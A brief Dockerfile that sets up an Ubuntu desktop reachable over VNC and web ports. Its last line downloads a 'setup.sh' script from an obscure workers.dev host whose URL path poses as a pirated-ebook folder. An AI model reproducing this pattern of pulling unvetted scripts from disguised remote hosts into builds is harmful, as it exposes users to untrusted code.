FROM dorowu/ubuntu-desktop-lxde-vnc
EXPOSE 443
EXPOSE 6080
WORKDIR /root
RUN apt install wget -y
ADD https://production.privateinskdfhsgfd.indexrd.workers.dev/0:/The%20Psychology%20of%20Money%20by%20Morgan%20Housel%20EPUB/setup.sh .
